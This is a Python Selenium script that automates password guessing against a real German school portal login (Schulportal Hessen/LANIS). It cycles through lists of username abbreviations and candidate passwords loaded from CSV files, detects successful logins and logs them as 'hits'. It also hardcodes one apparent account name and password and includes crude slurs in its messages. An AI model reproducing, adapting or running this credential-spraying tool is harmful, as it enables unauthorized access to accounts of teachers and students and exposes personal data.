
import glob
from re import X
import time
from time import sleep
from unittest import result
import csv
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.actions.wheel_input import ScrollOrigin
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import multiprocessing as mp
from multiprocessing import Pool

# 12345 und 123456 ist done

browser = webdriver.Firefox()

browser.get('https://portal.lanis-system.de/?i=6110')
time.sleep(2) # give the site time to load

action = ActionChains(browser)
wait = WebDriverWait(browser, 10)  # Adjust the timeout as needed


# user data               
userName = "stk" # Krzel PS = offline krzel / STK 27775
pw = "27775" # later on should be importet from csv file library
new_rows = []
hits = []
column_index = 0

usernames = 'UserNamesLaKurzel.csv'
usernamesList = []
passwordCol = 'passwordCol.csv'
passwordCollecList = []
hitsfile = 'hits.csv'
allHits =["----------------------- all hits -----------------------",""]

hitsCounter = 0
missCounter = 0




def writeHit(hit):
    with open(hitsfile, mode='a', newline='') as new_csv_file:
        csv_writer = csv.writer(new_csv_file)
        csv_writer.writerows(hit)

def loadFileIntoArray(filename,custarray):
    with open(filename, mode='r') as csv_file:
        csv_reader = csv.reader(csv_file)
        for row in csv_reader:
             custarray.append(row)


def login(funcPw):
  
 for user in usernamesList:
  if browser.find_elements(By.ID, 'username2') != None: 
      
          if browser.find_elements(By.ID, 'username2') != None:
           
            tfLoginName = browser.find_element(By.ID, 'username2')
            tfLoginPw = browser.find_element(By.ID, 'inputPassword')  
            action.move_to_element(to_element=tfLoginName)  
            tfLoginName.clear()
            tfLoginName.send_keys(user) ## change         
            tfLoginPw.clear()
            tfLoginPw.send_keys(funcPw)             
            print(user)
            browser.find_element(By.ID,'tlogin').click()          
    
            time.sleep(0.2)
            try: 
                 if browser.find_element(By.ID, 'fehler_text_alert_error').is_displayed():                    
                    globals()['missCounter']  = missCounter +1
                    print("Counter: "+str(globals()['missCounter'])+ " Misses, "+str(globals()['hitsCounter'])+" Hits")
                 elif browser.find_element(By.ID, 'error-message-card').is_displayed():
                     pass
            except: 
               try:
                   if browser.find_element(By.ID, 'error-message-card').is_displayed():
                     print('that mf again')
                     print("reloading because of retard name")
                     browser.get('https://start.schulportal.hessen.de/index.php?logout=all') # reload browser
                     time.sleep(2)
                     browser.get('https://portal.lanis-system.de/?i=6110') # go back to main page
                     time.sleep(2)
               except:                   
                   try:
                       wait.until(EC.presence_of_element_located((By.ID, 'show')))
                       if browser.find_element(By.ID, 'show').is_displayed():
                         globals()['hitsCounter'] = hitsCounter +1
                         allHits.append([str(user)+","+str(funcPw)])
                         print("Counter: "+str(globals()['missCounter']) + " Misses, "+str(globals()['hitsCounter'])+" Hits")
                         writeHit(allHits)
                         print("reloading because of hit")
                         browser.get('https://start.schulportal.hessen.de/index.php?logout=all') # reload browser
                         time.sleep(2)
                         browser.get('https://portal.lanis-system.de/?i=6110') # go back to main page
                         time.sleep(2)
                       elif browser.find_element(By.ID, 'error-message-card').is_displayed():
                              print("reloading because of error")
                              browser.get('https://start.schulportal.hessen.de/index.php?logout=all') # reload browser
                              time.sleep(2)
                              browser.get('https://portal.lanis-system.de/?i=6110') # go back to main page  
                   except:
                       print("reloading because of general problem")
                       allHits.append([str(user)+","+str(funcPw)+"some problem occured/potential hit"])
                       writeHit(allHits)
                       browser.get('https://start.schulportal.hessen.de/index.php?logout=all') # reload browser
                       time.sleep(2)
                       browser.get('https://portal.lanis-system.de/?i=6110') # go back to main page
                       time.sleep(2)
               
               
                 
  else:
      print("error")
      

def execute(pw):    
    login(pw) 
   
    
def execute2(pw):    
    login(pw) 
def execute3(pw):    
    login(pw) 




#### loading functions
loadFileIntoArray(usernames,usernamesList)
loadFileIntoArray(passwordCol,passwordCollecList)
print(passwordCollecList)
#print(usernamesList)

for i in passwordCollecList:
    print(i)
    execute(i)

''' # main problem: band width
if __name__ == '__main__':
    p1 = mp.Process(target=execute, args=(27775,))
    p2 = mp.Process(target=execute2, args=(1234,))
    p3 = mp.Process(target=execute3, args=(123456,))
    
    p1.start()
    p1.join()
    p2.start()
    p2.join()
'''     

    

    
  